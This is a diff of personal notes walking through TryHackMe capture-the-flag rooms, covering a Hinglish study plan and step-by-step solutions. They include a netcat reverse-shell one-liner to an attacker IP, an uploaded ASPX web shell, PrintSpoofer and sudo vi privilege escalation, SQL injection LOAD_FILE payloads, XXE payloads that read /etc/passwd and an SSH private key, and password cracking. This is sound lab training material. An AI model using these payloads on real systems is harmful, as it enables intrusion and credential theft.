@@ -2,48 +2,80 @@
 
 ## Room Order
 
-### 1.  Ignite
+### 1) Ignite
 
-##### 👉 Very basic web exploitation, perfect start
+**Link:** [https://tryhackme.com/room/ignite](https://tryhackme.com/room/ignite)  
+###### 👉 Famous for abusing a **CMS vulnerability** to get quick access. Great first exposure to web exploitation flow.
 
-### 2. smbclient / NO PEAS labs
+---
 
-##### 👉 Specific tool-based practice (pehle fundamentals better hain)
-### 3.  Basic Pentesting
+### 2) Relevant
 
-##### 👉 Enumeration + privilege escalation ka foundation
+**Link:** [https://tryhackme.com/room/relevant](https://tryhackme.com/room/relevant)  
+###### 👉 Known for **SMB share discovery → web access → Windows privilege escalation** chain.
 
-### 4.  Mr. Robot → linPEAS
+---
 
-##### 👉 Classic Linux enum + privesc practice
+### 3) Basic Pentesting
 
-### 5.  Kenobi → linPEAS
+**Link:** [https://tryhackme.com/room/basicpentestingjt](https://tryhackme.com/room/basicpentestingjt)  
+###### 👉 Teaches classic **enum → creds → SSH → sudo** style attack path.
 
-##### 👉 SMB, SUID, enumeration strong hoti hai
+---
 
-### 6.  Chocolate Factory → linPEAS
+### 4) Mr Robot
 
-##### 👉 Multiple attack vectors, thoda tricky
+**Link:** [https://tryhackme.com/room/mrrobot](https://tryhackme.com/room/mrrobot)  
+######  👉 Popular for **directory brute force + wordlists + Linux privesc basics**.
 
-### 7.  Year of the Rabbit → linPEAS
+---
 
-##### 👉 Enumeration depth aur patience improve karta hai
+### 5) Kenobi
 
-### 8.  Year of the Dog
+**Link:** [https://tryhackme.com/room/kenobi](https://tryhackme.com/room/kenobi)  
+######  👉 Very well known for **SMB + NFS interaction** and a memorable **SUID privilege escalation trick**.
 
-##### 👉 Is stage pe ye zyada sense banata hai
+---
 
-### 9.  Bookstore
+### 6) Chocolate Factory
 
-##### 👉 Web-focused, thoda guessy ho sakta hai
+**Link:** [https://tryhackme.com/room/chocolatefactory](https://tryhackme.com/room/chocolatefactory)  
+###### 👉 Special because of **multiple paths** and needing good exploration before choosing the correct one.
 
-### 10. Mustacchio
+---
 
-##### 👉 Enumeration-heavy, isliye end me better
+### 7) Year of the Rabbit
 
-### 11. Gaming Server
+**Link:** [https://tryhackme.com/room/yearoftherabbit](https://tryhackme.com/room/yearoftherabbit)  
+###### 👉 Known for **rabbit holes & redirections**. Rewards careful observation.
 
-##### 👉 Enumeration-heavy, isliye end me better
+---
+
+### 8) Year of the Dog
+
+**Link:** [https://tryhackme.com/room/yearofthedog](https://tryhackme.com/room/yearofthedog)  
+###### 👉 Focuses on **chaining information together**. Less obvious clues, more thinking.
+
+---
+
+### 9) Bookstore
+
+**Link:** https://tryhackme.com/room/bookstore  
+###### 👉 Memorable for **API/web enumeration** and understanding how endpoints expose data.
+
+---
+
+### 10) Mustacchio
+
+**Link:** [https://tryhackme.com/room/mustacchio](https://tryhackme.com/room/mustacchio)  
+###### 👉 Famous for the **XML/XPath injection** style vulnerability. If you learn this, you unlock many similar CTFs.
+
+---
+
+### 11) Gaming Server
+
+**Link:** [https://tryhackme.com/room/gamingserver](https://tryhackme.com/room/gamingserver)  
+###### 👉 Special for **strong enumeration discipline** and spotting small misconfigurations.
 
 
 ## Ignite
@@ -122,7 +154,125 @@ cat  /root/root.txt
 
 We got root flag
 
+
+## Relevant
+
+Run nmap scans and we found smb and other things
+
+```
+nmap -sC -sV -vv –script=vuln <IP>
+```
+
+We found another port 49663 running our Microsoft IIS
+
+```
+smbclient -L <IP>
+```
+
+```
+smbclient \\\\<IP>\\nt4wrksv
+```
+
+```
+ls
+```
+
+```
+get passwords.txt
+```
+
+We found 2 hashes now decode it one by one
+
+```
+echo "<hash>" | base64 -d
+```
+
+##### These credentials wont work as they are placed to confuse us and waste our time
+
+Now Microsoft IIS usually runs aspx
+
+https://github.com/borjmz/aspx-reverse-shell
+
+Click on raw and copy it to a file shell.aspx
+
+Now change IP to tun0 IP
+
+Go to http://IP:49663/nt4wrksv/passwords.txt
+
+So, we are able to see our file
+
+Now in smb login type
+
+```
+put shell.aspx
+```
+
+Run a netcat listener in your system
+
+```
+nc -lvnp 1234
+```
+
+
+Now go to this url
+
+http://IP:49663/nt4wrksv/shell.aspx
+
+And we got our reverse shell
+
+
+```
+(Get-ChildItem C:\ -Filter user.txt -Recurse -ErrorAction SilentlyContinue).FullName
+```
+
+```
+cd C:\Users\Bob\Desktop
+```
+
+```
+dir
+```
+
+```
+type user.txt
+```
+
+##### We found user flag
   
+```
+whoami /priv
+```
+
+We found a vulnerability SeImpersonatePrivilege
+
+https://github.com/k4sth4/PrintSpoofer
+
+Now move file to home and
+
+```
+put PrintSpoofer.exe
+```
+
+```
+cd C:\inetpub\wwwroot\nt4wrksv
+```
+
+```
+PrintSpoofer.exe -i -c cmd
+```
+
+Now we are root
+
+If we do whoami it shows nt authority\system
+
+```
+cd C:\Users\Administrator\Desktop
+```
+
+```
+cat root.txt
+```
+
 
 ## Basic Pentesting
 
@@ -433,14 +583,14 @@ mount <IP>:/var /mnt/kenobi```
 
 ls -la /mnt/kenobi
 
-cp /mnt/kenobiNFS/tmp/id_rsa .
+cp /mnt/kenobi/tmp/id_rsa .
 
 sudo chmod 600 id_rsa
 
 ssh -i id_rsa kenobi@10.49.133.202
 ```
 
-##### We found first flag after login
+#### We found first flag after login
 
 
 #### Privilege escalation
@@ -509,7 +659,8 @@ cd root
 cat root.txt
 ```
 
-  
+
+
 ## Chocolate Factory
 
 ```
@@ -586,8 +737,6 @@ hashcat -m <hash_type> -a <attack_mode> <hash_file> <word_list>
 hashcat -m 1800 -a 0 charlie_hash_file rockyou.txt
 ```
 
-  
-
 | Hash Type      | Mode  |
 | -------------- | ----- |
 | MD5            | 0     |
@@ -601,8 +750,6 @@ hashcat -m 1800 -a 0 charlie_hash_file rockyou.txt
 
 We found password as cn7824
 
-
-
 We logged in and were redirected to home.php which we already found with gobuster
 
 We will now run a reverse netcat listener
@@ -611,37 +758,53 @@ https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
 
 First run a reverse shell listener in our machine
 
-```nc -lvnp 1234```
+```
+nc -lvnp 1234
+```
 
 Now run this command in the command thing
 
-```rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.132.222 1234 >/tmp/f```
+```
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.132.222 1234 >/tmp/f
+```
 
 After reverse shell
 
 Run
 
-```cd /home/charlie```
+```
+cd /home/charlie
+```
 
 We found a file user.txt which we cant open
 
 We also found another file
 
-```cat teleport```
+```
+cat teleport
+```
 
 We found RSA file
 
 Save this file inside ur system
 
-```chmod 600 charlie_rsa```
+```
+chmod 600 charlie_rsa
+```
 
-```ssh -i charlie_rsa charlie@<IP>```
+```
+ssh -i charlie_rsa charlie@<IP>
+```
 
-```cat /home/charlie/user.txt```
+```
+cat /home/charlie/user.txt
+```
 
 ![enum result](Assets/17.png)
 
-```sudo -l```
+```
+sudo -l
+```
 
 ![enum result](Assets/18.png)
 
@@ -651,9 +814,11 @@ We found that we can go root now
 
 Now we found
 
-```sudo vi -c ':!/bin/sh' /dev/null```
+```
+sudo vi -c ':!/bin/sh' /dev/null
+```
 
-```Run this in machine```
+Run this in machine
 
 We are root now
 
@@ -662,164 +827,9 @@ If we do ls we found 2 files
 ![enum result](Assets/19.png)
 Run root.py
 
-```python root.py```
-
-
-## Mustacchio
-
-``` 
-nmap -p- -sC -sV IP
-gobuster dir -u url_here -w wordlist
 ```
-
-We found a directory called /custom
-
-IP/custom
-
-Now if we go to js folder inside custom, we found a backup file called users.bak
-
+python root.py
 ```
-file users.bak
-```
-
-![[Pasted image 20260213100445.png]]
-
-We found our database being SQLite
-
-Now if we want to see content of our file we will be using sqlitebrowser tool
-
-```
- sqlitebrowser users.bak
-```
-
-Now a tab opens which shows us that we have credentials in it
-
-Click on Browse Data tab and we got our admin credentials
-
-![[Pasted image 20260213100727.png]]
-
-The password is in hash format
-
-Let us find its hash type
-
-```
-hash-identifier 1868e36a6d2b17d4c2745f1659433a54d4bc5f4b
-```
-
-![[Pasted image 20260213100834.png]]
-
-We got our hash as SHA-1
-
-Let us break this hash
-
-```
-echo '1868e36a6d2b17d4c2745f1659433a54d4bc5f4b' > file.hash
-```
-
-Now I have already done this so I will delete my john pot file
-
-```
-sudo rm ~/.john/john.pot   
-```
-
-```
-john file.hash --wordlist=rockyou.txt --format=RAW-SHA1
-```
-
-![[Pasted image 20260213101434.png]]
-
-We got our password bulldog19
-
-We have a port 8765 open which has a login page so let us use these credentials
-
-We are in our admin panel now
-
-![[Pasted image 20260213101716.png]]
-
-Now I didnt find it useful but I did found somethings in page soure
-
-![[Pasted image 20260213101832.png]]
-
-I got a username barry and a path to another .bak file
-
-Go to the browser and find this page
-
-```
-http://IP:8765/auth/dontforget.bak
-```
-
-I got another file
-
-```
-file dontforget.bak
-```
-
-![[Pasted image 20260213102040.png]]
-
-Now this one is an XML file
-
-```
-subl dontforget.bak
-```
-
-![[Pasted image 20260213102132.png]]
-
-Copy whole xml code and put it inside the comment box and we found that we can do XXE in this
-
-We will add 
-
-```
-<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
-```
-
-This into our XML code
-
-```
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
-<comment>
-  <name>&xxe;</name>
-  <author>Barry Clad</author>
-  <com>his paragraph was a waste of time and space. If you had not read this and I had not typed this you and I could’ve done something more productive than reading this mindlessly and carelessly as if you did not have anything else to do in life. Life is so precious because it is short and you are being so careless that you do not realize it until now since this void paragraph mentions that you are doing something so mindless, so stupid, so careless that you realize that you are not using your time wisely. You could’ve been playing with your dog, or eating your cat, but no. You want to read this barren paragraph and expect something marvelous and terrific at the end. But since you still do not realize that you are wasting precious time, you still continue to read the null paragraph. If you had not noticed, you have wasted an estimated time of 20 seconds.</com>
-</comment>
-```
-
-If we run this and we get our etc/passwd file then we can get rsa file of our user barry too
-
-![[Pasted image 20260213102705.png]]
-
-We got our file now make some changes in DOCTYPE
-
-```
-<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///home/barry/.ssh/id_rsa"> ]>
-```
-
-Like this
-
-```
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///home/barry/.ssh/id_rsa"> ]>
-<comment>
-  <name>&xxe;</name>
-  <author>Barry Clad</author>
-  <com>his paragraph was a waste of time and space. If you had not read this and I had not typed this you and I could’ve done something more productive than reading this mindlessly and carelessly as if you did not have anything else to do in life. Life is so precious because it is short and you are being so careless that you do not realize it until now since this void paragraph mentions that you are doing something so mindless, so stupid, so careless that you realize that you are not using your time wisely. You could’ve been playing with your dog, or eating your cat, but no. You want to read this barren paragraph and expect something marvelous and terrific at the end. But since you still do not realize that you are wasting precious time, you still continue to read the null paragraph. If you had not noticed, you have wasted an estimated time of 20 seconds.</com>
-</comment>
-```
-
-Now we got our rsa key now lets login using that particular rsa key
-
-Now take this key and crack it
-
-```
-ssh2john id_rsa > book.hash
-john book.hash --wordlist=rockyou.txt
-```
-
-![[Pasted image 20260213103229.png]]
-
-We got our password urieljames
-
-
 
 
 ## Year of the Rabbit
@@ -999,18 +1009,24 @@ This tells us that we have two tables, now let us find the table name
 
 Now we will check if 1 value is correct 
 
-```' UNION SELECT 1,NULL-- --```
+```
+' UNION SELECT 1,NULL-- --
+```
 
 This one doesn't work so we will try on other one
 
-```' UNION SELECT NULL,1-- --```
+```
+' UNION SELECT NULL,1-- --
+```
 
 ![enum result](37.png)
 
 
 Now in this another query also works
 
-```' UNION SELECT NULL, version()-- --```
+```
+' UNION SELECT NULL, version()-- --
+```
 
 This shows us ubuntu but we ran MySQL command which states the database is MySQL
 
@@ -1024,18 +1040,24 @@ https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/
 
 We can LOAD a file in this 
 
-```' UNION SELECT NULL, LOAD_FILE('/etc/passwd')-- --```
+```
+' UNION SELECT NULL, LOAD_FILE('/etc/passwd')-- --
+```
 
 
 ![enum result](39.png)
 
 Mostly we have default paths in HTML configs which is 
 
-```/var/www/html/page_name```
+```
+/var/www/html/page_name
+```
 
 We earlier found a file called config.php, Now we will add this injection to access it
 
-```' UNION SELECT NULL, LOAD_FILE('/var/www/html/config.php')-- --```
+```
+' UNION SELECT NULL, LOAD_FILE('/var/www/html/config.php')-- --
+```
 
 We found a username and its password
 
@@ -1043,7 +1065,9 @@ We found a username and its password
 
 We have our username and password so we can try SSH login
 
-```ssh web@IP```
+```
+ssh web@IP
+```
 
 Password- Cda3RsDJga
 
@@ -1117,11 +1141,15 @@ If we cat in this file we can see something
 
 We found dylan's password
 
-```Labr4d0rs4L1f3```
+```
+Labr4d0rs4L1f3
+```
 
 Let us try ssh login into this
 
-```ssh dylan@IP```
+```
+ssh dylan@IP
+```
 
 ![enum result](48.png)
 
@@ -1134,97 +1162,174 @@ Now cat dylan's user.txt file
 Everything is okay in this we have to take a different path now
 
 
-## Relevant
-
-Run nmap scans and we found smb and other things
-
-```
-nmap -sC -sV -vv –script=vuln <IP>
-```
-
-We found another port 49663 running our Microsoft IIS
-
-```smbclient -L <IP>```
-
-```smbclient \\\\<IP>\\nt4wrksv```
-
-```ls```
-
-```get passwords.txt```
-
-We found 2 hashes now decode it one by one
-
-```echo "<hash>" | base64 -d```
-
-##### These credentials wont work as they are placed to confuse us and waste our time
-
-Now Microsoft IIS usually runs aspx
-
-https://github.com/borjmz/aspx-reverse-shell
-
-Click on raw and copy it to a file shell.aspx
-
-Now change IP to tun0 IP
-
-Go to http://IP:49663/nt4wrksv/passwords.txt
-
-So, we are able to see our file
-
-Now in smb login type
-
-```put shell.aspx```
-
-Run a netcat listener in your system
-
-```nc -lvnp 1234```
-
-
-Now go to this url
-
-http://IP:49663/nt4wrksv/shell.aspx
-
-And we got our reverse shell
-
-
-```(Get-ChildItem C:\ -Filter user.txt -Recurse -ErrorAction SilentlyContinue).FullName```
-
-```cd C:\Users\Bob\Desktop ```
-
-```dir```
-
-```type user.txt```
-
-##### We found user flag
-  
-```whoami /priv```
-
-We found a vulnerability SeImpersonatePrivilege
-
-https://github.com/k4sth4/PrintSpoofer
-
-Now move file to home and
-
-```put PrintSpoofer.exe```
-
-```cd C:\inetpub\wwwroot\nt4wrksv```
-
-```PrintSpoofer.exe -i -c cmd```
-
-Now we are root
-
-If we do whoami it shows nt authority\system
-
-```cd C:\Users\Administrator\Desktop```
-
-```cat root.txt```
-  
-
-## smbClient
-
-  
-  
-
 ## BookStore
+
+
+
+## Mustacchio
+
+``` 
+nmap -p- -sC -sV IP
+```
+
+```
+gobuster dir -u url_here -w wordlist
+```
+
+We found a directory called /custom
+
+IP/custom
+
+Now if we go to js folder inside custom, we found a backup file called users.bak
+
+```
+file users.bak
+```
+
+![enum result](50.png)
+
+We found our database being SQLite
+
+Now if we want to see content of our file we will be using sqlitebrowser tool
+
+```
+ sqlitebrowser users.bak
+```
+
+Now a tab opens which shows us that we have credentials in it
+
+Click on Browse Data tab and we got our admin credentials
+
+![enum result](51.png)
+
+The password is in hash format
+
+Let us find its hash type
+
+```
+hash-identifier 1868e36a6d2b17d4c2745f1659433a54d4bc5f4b
+```
+
+![enum result](52.png)
+
+We got our hash as SHA-1
+
+Let us break this hash
+
+```
+echo '1868e36a6d2b17d4c2745f1659433a54d4bc5f4b' > file.hash
+```
+
+Now I have already done this so I will delete my john pot file
+
+```
+sudo rm ~/.john/john.pot   
+```
+
+```
+john file.hash --wordlist=rockyou.txt --format=RAW-SHA1
+```
+
+![enum result](53.png)
+
+We got our password bulldog19
+
+We have a port 8765 open which has a login page so let us use these credentials
+
+We are in our admin panel now
+
+![enum result](54.png)
+
+Now I didnt find it useful but I did found somethings in page soure
+
+![enum result](55.png)
+
+I got a username barry and a path to another .bak file
+
+Go to the browser and find this page
+
+```
+http://IP:8765/auth/dontforget.bak
+```
+
+I got another file
+
+```
+file dontforget.bak
+```
+
+![enum result](56.png)
+
+Now this one is an XML file
+
+```
+subl dontforget.bak
+```
+
+![enum result](57.png)
+
+Copy whole xml code and put it inside the comment box and we found that we can do XXE in this
+
+We will add 
+
+```
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+```
+
+This into our XML code
+
+```
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+<comment>
+  <name>&xxe;</name>
+  <author>Barry Clad</author>
+  <com>his paragraph was a waste of time and space. If you had not read this and I had not typed this you and I could’ve done something more productive than reading this mindlessly and carelessly as if you did not have anything else to do in life. Life is so precious because it is short and you are being so careless that you do not realize it until now since this void paragraph mentions that you are doing something so mindless, so stupid, so careless that you realize that you are not using your time wisely. You could’ve been playing with your dog, or eating your cat, but no. You want to read this barren paragraph and expect something marvelous and terrific at the end. But since you still do not realize that you are wasting precious time, you still continue to read the null paragraph. If you had not noticed, you have wasted an estimated time of 20 seconds.</com>
+</comment>
+```
+
+If we run this and we get our etc/passwd file then we can get rsa file of our user barry too
+
+![enum result](58.png)
+
+We got our file now make some changes in DOCTYPE
+
+```
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///home/barry/.ssh/id_rsa"> ]>
+```
+
+Like this
+
+```
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///home/barry/.ssh/id_rsa"> ]>
+<comment>
+  <name>&xxe;</name>
+  <author>Barry Clad</author>
+  <com>his paragraph was a waste of time and space. If you had not read this and I had not typed this you and I could’ve done something more productive than reading this mindlessly and carelessly as if you did not have anything else to do in life. Life is so precious because it is short and you are being so careless that you do not realize it until now since this void paragraph mentions that you are doing something so mindless, so stupid, so careless that you realize that you are not using your time wisely. You could’ve been playing with your dog, or eating your cat, but no. You want to read this barren paragraph and expect something marvelous and terrific at the end. But since you still do not realize that you are wasting precious time, you still continue to read the null paragraph. If you had not noticed, you have wasted an estimated time of 20 seconds.</com>
+</comment>
+```
+
+Now we got our rsa key now lets login using that particular rsa key
+
+Now take this key and crack it
+
+```
+ssh2john id_rsa > book.hash
+```
+
+```
+john book.hash --wordlist=rockyou.txt
+```
+
+![enum result](59.png)
+
+We got our password urieljames
+
+
+
+## Game Server
+
 
   
 
